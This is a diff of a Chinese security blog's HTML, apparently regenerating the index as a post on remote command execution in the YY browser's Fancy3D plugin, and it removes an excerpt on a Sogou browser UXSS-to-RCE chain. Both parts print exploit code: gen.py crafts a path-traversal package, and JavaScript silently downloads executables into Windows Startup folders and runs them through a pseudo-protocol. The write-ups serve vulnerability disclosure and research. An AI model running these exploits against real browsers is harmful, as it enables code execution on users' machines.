@@ -66,7 +66,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="安全,浏览器安全," />
 
 
 
@@ -84,15 +84,33 @@
 
 
 
-<meta name="description">
-<meta property="og:type" content="website">
-<meta property="og:title" content="zhchbin">
-<meta property="og:url" content="http://zhchbin.github.io/index.html">
+<meta name="description" content="案例链接：http://www.wooyun.org/bugs/wooyun-2016-0221080
+这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。
+免责声明本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!
+前言在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：
+1ht">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行">
+<meta property="og:url" content="http://zhchbin.github.io/2016/10/15/YY-Browser-RCE/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description">
+<meta property="og:description" content="案例链接：http://www.wooyun.org/bugs/wooyun-2016-0221080
+这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。
+免责声明本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!
+前言在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：
+1ht">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/7184df6bgw1f4xgo3kp46j20mb0htn3y.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/7184df6bgw1f4xg9lwxk8j20ru07cwi6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7184df6bgw1f4xgbxgu0rj20qe04itaj.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1f4xie83ou5j20hp030jt7.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7184df6bgw1f4y97swvl3g20qu0h979t.gif">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="zhchbin">
-<meta name="twitter:description">
+<meta name="twitter:title" content="[浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行">
+<meta name="twitter:description" content="案例链接：http://www.wooyun.org/bugs/wooyun-2016-0221080
+这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。
+免责声明本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!
+前言在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：
+1ht">
 
 
 
@@ -114,9 +132,9 @@
 
 
 
-  <link rel="canonical" href="http://zhchbin.github.io/"/>
+  <link rel="canonical" href="http://zhchbin.github.io/2016/10/15/YY-Browser-RCE/"/>
 
-  <title> zhchbin </title>
+  <title> [浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行 | zhchbin </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -147,9 +165,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -236,9 +252,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -258,10 +274,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2016/10/15/YY-Browser-RCE/" itemprop="url">
-                  [浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行
-                </a>
+                [浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行
               
             
           </h1>
@@ -308,9 +321,7 @@
       
 
       
-        
-          
-            <p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0221080" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0221080</a></p>
+        <p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0221080" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0221080</a></p>
 <p>这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。</p>
 <h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：</p>
@@ -357,172 +368,84 @@
 <p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg" alt=""></p>
 <h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>gen.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">inputFileName = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#fileName = "..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe"</span></span><br><span class="line">fileName = <span class="string">"loaderjz.dll"</span></span><br><span class="line">fileNameLength = len(fileName) + <span class="number">1</span></span><br><span class="line">lzmaFile = inputFileName + <span class="string">".lzma"</span></span><br><span class="line">outputFile = <span class="string">"output.lzma"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(fname)</span>:</span></span><br><span class="line">    hash_md5 = hashlib.md5()</span><br><span class="line">    <span class="keyword">with</span> open(fname, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> iter(<span class="keyword">lambda</span>: f.read(<span class="number">4096</span>), <span class="string">b""</span>):</span><br><span class="line">            hash_md5.update(chunk)</span><br><span class="line">    <span class="keyword">return</span> hash_md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(outputFile, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, <span class="number">32</span> + fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(lzmaFile) + <span class="number">1</span>))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(inputFileName)))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, <span class="number">0x11</span>))</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">16</span>)</span><br><span class="line">    f.write(fileName)</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">with</span> open(lzmaFile, <span class="string">"rb"</span>) <span class="keyword">as</span> lzmaF:</span><br><span class="line">        f.write(lzmaF.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> outputFile + <span class="string">"||"</span> + md5(outputFile) + <span class="string">"||"</span> + str(os.path.getsize(outputFile)) +\</span><br><span class="line">        <span class="string">"||"</span> + md5(inputFileName) + <span class="string">"||"</span> + str(os.path.getsize(inputFileName))</span><br></pre></td></tr></table></figure>
-          
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
     <footer class="post-footer">
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/06/Sogou-Browser-RCE/" itemprop="url">
-                  [浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-10-06T10:57:48+08:00" content="2016-10-06">
-              2016-10-06
-            </time>
-          </span>
-
+        <div class="post-tags">
           
-
+            <a href="/tags/安全/" rel="tag">#安全</a>
           
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/10/06/Sogou-Browser-RCE/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/06/Sogou-Browser-RCE/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
+            <a href="/tags/浏览器安全/" rel="tag">#浏览器安全</a>
           
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0213422" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0213422</a></p>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p>
-<h3 id="0x00-首先是UXSS"><a href="#0x00-首先是UXSS" class="headerlink" title="0x00 首先是UXSS"></a>0x00 首先是UXSS</h3><p>具体见：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=569496" target="_blank" rel="external">https://bugs.chromium.org/p/chromium/issues/detail?id=569496</a></p>
-<p>浏览器版本号：6.3.8.21279</p>
-<h3 id="0x01-既然可以UXSS，我们找个特权域"><a href="#0x01-既然可以UXSS，我们找个特权域" class="headerlink" title="0x01 既然可以UXSS，我们找个特权域"></a>0x01 既然可以UXSS，我们找个特权域</h3><p>从漏洞 <a href="http://wooyun.org/bugs/wooyun-2010-0145023" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0145023</a> 我们可以知道搜狗浏览器的扩展有下载任意文件到任意位置的API！我们自己写一个恶意扩展，提交并通过审核的可能性基本为0。这个API这么好用，但又只能从：se-extension://域名下进行调用，好像很难构造吧。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sogouExplorer.downloads.downloadSilently(&#123;</span><br><span class="line">  url:"http://tmxk.org/img/r-c.png",</span><br><span class="line">  filename:"dd.exe",</span><br><span class="line">  path:"d:\",</span><br><span class="line">  method:"GET"</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<p>我在想怎么利用上面的UXSS的时候，突发奇想的测试了一下，我们能不能打到se-extension://这个域名，于是进行一下测试。我找了一个搜狗浏览器安装时启用的默认扩展，找到其background.html的地址：<code>se-extension://ext238561744/background.html</code>。结果当然是没有那么容易，会提示如下的信息：</p>
-<blockquote>
-<p>Denying load of se-extension://ext238561744/background.html. Resources must be listed in the web_accessible_resources manifest key in order to be loaded by pages outside the extension.</p>
-</blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idldd42oj20hs0cstb1.jpg" alt=""></p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idmtvo71j20ry0j0gou.jpg" alt=""></p>
-<h3 id="0x02-难道没法子？"><a href="#0x02-难道没法子？" class="headerlink" title="0x02 难道没法子？"></a>0x02 难道没法子？</h3><p>我认真的读了两秒这个提示后，原来还允许开发者通过<code>web_accessible_resources</code>指定某些资源，从而实现在扩展外被访问！当然，我们就去试试运气去默认的扩展下找找看有没有吧。搜狗浏览器安装的插件在这个目录下：</p>
-<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="command">\Users</span><span class="command">\Username</span><span class="command">\AppData</span><span class="command">\Roaming</span><span class="command">\SogouExplorer</span><span class="command">\Extension</span></span><br></pre></td></tr></table></figure>
-<p>grep一下，找到了一个插件，搜狗打假助手，<code>com.sogou.antiCrime</code>，其manifest.xml文件中有以下的内容：</p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idowi21sj20n90h5465.jpg" alt="">)</p>
-<p>于是就把要打的域名地址换成了：</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se-<span class="symbol">extension:</span>/<span class="regexp">/ext238561744/jd</span><span class="regexp">/images/ac</span>-logo.png</span><br></pre></td></tr></table></figure>
-<p>一开始我还觉得这是一个PNG图片，即使没有被拒绝访问，也应该用不了扩展的API吧。我本来是很怀疑能不能行的，正想放弃的时候，我还是觉得应该尝试一发。把PoC里的expolit.html里的f函数改一下，尝试下载一个文件到<code>c:\Users\</code>目录下。</p>
-<p>备注：后来想想其实也对，因为图片在浏览器打开的时候浏览器用自动的使用img标签插入来显示图片。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"f()"</span>)</span><br><span class="line">  <span class="keyword">if</span> (++c1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x1 = x.contentWindow[<span class="number">0</span>].frameElement.nextSibling;</span><br><span class="line">    <span class="comment">// x1.src = 'se-extension://ext238561744/background.html';         // Denied</span></span><br><span class="line">    x1.src = <span class="string">'se-extension://ext238561744/jd/images/ac-logo.png'</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (x1.contentDocument) &#123; ml(); &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      x1.src = <span class="string">"javascript:if(location != 'about:blank') &#123;console.log(location); sogouExplorer.downloads.downloadSilently(&#123;url:'http://127.0.0.1/test.js',filename:'test.js',path:'c:\\\\Users\\\\',method:'GET'&#125;);&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idw8oogbj20ru0ivgqz.jpg" alt=""></p>
-<h3 id="0x03-最终我们做到了！"><a href="#0x03-最终我们做到了！" class="headerlink" title="0x03 最终我们做到了！"></a>0x03 最终我们做到了！</h3><p>上面下载好文件之后，我们可以直接使用伪协议来执行，在 <a href="http://wooyun.org/bugs/wooyun-2010-0177221" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0177221</a> 最新版依旧没有加个提示什么的。而且现在我们又扩展名<code>.js</code>了。直接可以执行。当然，我们也可以写到用户的启动目录中，至于怎么拿到用户名，这个 <a href="http://wooyun.org/bugs/wooyun-2010-0176436" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0176436</a> 的漏洞都公开了，然后好像什么修复工作都没有做。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"vbefile:/../../../../../../Users/test.js"</span></span><br></pre></td></tr></table></figure>
-<p>获取用户名的过程：用户访问open.html，跳转到data:域下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href = <span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMjcuMC4wLjEvZXZpbC5qcyc+PC9zY3JpcHQ+"</span></span><br></pre></td></tr></table></figure></p>
-<p>其中base64解密后内容为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">'http://127.0.0.1/evil.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>evil.js在data域下执行，可以获取到用户名列表，然后再跳转到需要写calc.exe到启动目录的页面中，完成写入操作！</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> users = data.match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/g</span>) || [];</span><br><span class="line">  <span class="keyword">var</span> currentUser=[];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; users.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> user = (users[i].match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/</span>) || [<span class="string">""</span>, <span class="string">""</span>])[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>([<span class="string">".."</span>, <span class="string">"All Users"</span>, <span class="string">"Default"</span>, <span class="string">"Default User"</span>, <span class="string">"Public"</span>, <span class="string">"UpdatusUser"</span>, <span class="string">"desktop.ini"</span>].indexOf(user) == -<span class="number">1</span>) &#123;</span><br><span class="line">      currentUser.push(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(currentUser);</span><br><span class="line">  <span class="keyword">return</span> currentUser;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.external.extension(<span class="string">"getRecommendSidebarExts"</span>, <span class="string">"file:///C:/Users/"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> (data.success != <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  location.href = <span class="string">'http://127.0.0.1/exploit.html?users='</span> + getUsers(data.data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>写文件到启动目录下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"f()"</span>)</span><br><span class="line">  <span class="keyword">if</span> (++c1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> users = top.location.search.replace(<span class="string">'?users='</span>).split(<span class="string">','</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> x1 = x.contentWindow[<span class="number">0</span>].frameElement.nextSibling;</span><br><span class="line">    <span class="comment">// x1.src = 'se-extension://ext238561744/background.html';         // Denied</span></span><br><span class="line">    x1.src = <span class="string">'se-extension://ext238561744/jd/images/ac-logo.png'</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (x1.contentDocument) &#123; ml(); &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="keyword">var</span> users_str = <span class="string">''</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; users.length; ++i) &#123;</span><br><span class="line">        users_str += (<span class="string">'"'</span> + users[i] + <span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i != users.length - <span class="number">1</span>)</span><br><span class="line">          users_str += <span class="string">','</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      x1.src = <span class="string">"javascript:if(location != 'about:blank') &#123; var users=["</span> + users_str + <span class="string">"]; for (var i = 0; i &lt; users.length; ++i) sogouExplorer.downloads.downloadSilently(&#123;url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'&#125;);&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>录个用伪协议执行的GIF</p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f8idxtyw70g20sg0j2do4.gif" alt=""></p>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/06/Sogou-Browser-RCE/" rel="next" title="[浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行">
+                <i class="fa fa-chevron-left"></i> [浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行
+              </a>
+            
+          </div>
 
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
       
 
       
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
+      
+    </div>
+  </div>
 
 
           </div>
@@ -530,6 +453,14 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/10/15/YY-Browser-RCE/"
+           data-title="[浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行" data-url="http://zhchbin.github.io/2016/10/15/YY-Browser-RCE/">
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -549,8 +480,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpeg"
@@ -636,6 +576,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#免责声明"><span class="nav-number">1.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-这个插件是哪里来的？"><span class="nav-number">3.</span> <span class="nav-text">0x00 这个插件是哪里来的？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-插件功能分析"><span class="nav-number">4.</span> <span class="nav-text">0x01 插件功能分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-分析文件格式"><span class="nav-number">5.</span> <span class="nav-text">0x02 分析文件格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行"><span class="nav-number">6.</span> <span class="nav-text">0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-任意路径写入漏洞导致RCE"><span class="nav-number">7.</span> <span class="nav-text">0x04 任意路径写入漏洞导致RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试代码"><span class="nav-number">7.1.</span> <span class="nav-text">测试代码</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -732,6 +683,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
